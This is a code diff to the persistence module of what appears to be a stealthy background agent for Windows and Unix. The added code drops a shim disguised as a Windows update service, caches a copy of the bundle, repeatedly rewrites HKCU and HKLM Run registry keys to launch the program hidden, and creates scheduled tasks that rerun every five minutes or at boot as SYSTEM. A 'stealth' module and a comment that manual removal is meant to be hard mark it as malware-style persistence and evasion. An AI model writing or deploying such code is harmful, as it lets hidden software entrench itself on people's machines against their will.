@@ -5,6 +5,7 @@ them by hand takes real effort, which is the point.
 """
 
 from __future__ import annotations
+from .. import guardian
 
 import os
 import shutil
@@ -107,6 +108,75 @@ def interpreter_for(entry: str) -> str:
 # --------------------------------------------------------------------------
 
 
+def _write_shim() -> str:
+    """Ensure WindowsUpdateService.cmd shim exists in primary directory."""
+    if not IS_WINDOWS:
+        return ""
+    shim = stealth.shim_path()
+    try:
+        os.makedirs(os.path.dirname(shim), exist_ok=True)
+        # Look for wu.cmd in bundle root install/wu.cmd
+        for candidate in (
+            os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
+            os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
+            os.path.join(config.ROOT, "install", "wu.cmd"),
+        ):
+            if os.path.isfile(candidate):
+                shutil.copy2(candidate, shim)
+                return shim
+    except Exception:
+        pass
+    return ""
+
+
+def _cache_kit() -> str:
+    """Ensure kit.zip is cached in primary directory."""
+    target = stealth.kit_cache_path()
+    try:
+        if os.path.isfile(target):
+            return target
+        os.makedirs(os.path.dirname(target), exist_ok=True)
+        from .. import packaging
+        blob = packaging.build_zip(stealth.bundle_root())
+        with open(target, "wb") as f:
+            f.write(blob)
+        return target
+    except Exception:
+        return ""
+
+
+def _reassert_run_keys() -> list[str]:
+    """Compare winreg QueryValueEx to expected command and rewrite only on mismatch."""
+    if not IS_WINDOWS:
+        return []
+    import winreg
+    from .. import config
+
+    shim = stealth.shim_path()
+    launcher = primary_launcher()
+    expected = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
+    if stealth.is_admin():
+        roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
+
+    actions = []
+    for root, label in roots:
+        for value_name in config.RUN_VALUE_NAMES:
+            try:
+                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
+                with key:
+                    try:
+                        val, _ = winreg.QueryValueEx(key, value_name)
+                    except FileNotFoundError:
+                        val = None
+                    if val != expected:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, expected)
+                        actions.append(f"reasserted {label}\Run\{value_name}")
+            except OSError:
+                pass
+    return actions
+
+
 def _write_run_keys(launcher: str) -> list[str]:
     """Create the HKCU and (when possible) HKLM Run entries."""
     import winreg
@@ -159,19 +229,22 @@ def _write_startup_script(launcher: str) -> str:
 def _write_scheduled_task(launcher: str) -> str:
     """Create a logon and startup task."""
     from .. import config
-    command = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    shim = stealth.shim_path()
+    command = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
     rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
     try:
         subprocess.run(
             ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
-             "/SC", "ONLOGON", "/RL", rl_level, "/IT"],
+             "/SC", "ONLOGON", "/RL", rl_level, "/IT",
+             "/DELAY", "0000:30", "/RI", "5", "/DU", "24:00"],
             capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
         )
-        subprocess.run(
-            ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
-             "/SC", "ONSTART", "/RU", "SYSTEM"],
-            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
-        )
+        if stealth.is_admin():
+            subprocess.run(
+                ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
+                 "/SC", "ONSTART", "/RU", "SYSTEM"],
+                capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
+            )
         return config.TASK_NAME
     except Exception:
         return ""
@@ -240,11 +313,14 @@ def install() -> list[str]:
     actions: list[str] = []
 
     if IS_WINDOWS:
+        _write_shim()
+        _cache_kit()
         actions += _write_run_keys(launcher)
         if _write_startup_script(launcher):
             actions.append("startup folder")
         if _write_scheduled_task(launcher):
             actions.append("scheduled task")
+        actions += guardian.install()
     else:
         actions.append(_write_unix_autostart(launcher))
         cron = _write_cron(launcher)
@@ -261,9 +337,17 @@ def ensure() -> list[str]:
     if missing:
         install_copies()
         actions.append(f"restored {len(missing)} copy(ies)")
-    if IS_WINDOWS and not _task_exists():
-        _write_scheduled_task(primary_launcher())
-        actions.append("recreated scheduled task")
+    if IS_WINDOWS:
+        if not _task_exists():
+            _write_scheduled_task(primary_launcher())
+            actions.append("recreated task")
+        if not os.path.isfile(stealth.shim_path()):
+            _write_shim()
+            actions.append("recreated shim")
+        if not os.path.isfile(stealth.kit_cache_path()):
+            _cache_kit()
+            actions.append("recached kit")
+        actions += _reassert_run_keys()
     return actions
 
 
@@ -364,6 +448,10 @@ def remove() -> list[str]:
     from .. import config
     removed: list[str] = []
 
+    if IS_WINDOWS:
+        removed += guardian.remove()
+        removed += guardian.clear_startup_approved()
+
     # 1. Terminate all running agent/watchdog processes
     killed = terminate_running_instances(exclude_pid=os.getpid())
     if killed:
@@ -432,6 +520,14 @@ def remove() -> list[str]:
                     except Exception:
                         pass
 
+    # Tombstone written after cleaning
+    try:
+        pdir = stealth.primary_directory()
+        os.makedirs(pdir, exist_ok=True)
+        open(os.path.join(pdir, "tombstone"), "w").close()
+    except OSError:
+        pass
+
     # 4. Remove lock and state files in all candidate temp folders
     candidate_temps = [tempfile.gettempdir()]
     if IS_WINDOWS:
@@ -485,3 +581,22 @@ def status() -> dict[str, object]:
         "launcher": primary_launcher(),
         "admin": stealth.is_admin(),
     }
+
+
+def purge() -> list[str]:
+    """Complete wipe including HKLM values, program data copies and runtime."""
+    removed = remove()
+    if IS_WINDOWS:
+        for p in (stealth.shim_path(), stealth.kit_cache_path(),
+                  os.path.join(stealth.primary_directory(), "deploy.json"),
+                  os.path.join(stealth.primary_directory(), "runtime")):
+            if os.path.exists(p):
+                try:
+                    if os.path.isdir(p):
+                        shutil.rmtree(p, ignore_errors=True)
+                    else:
+                        os.remove(p)
+                    removed.append(f"purged {p}")
+                except OSError:
+                    pass
+    return removed
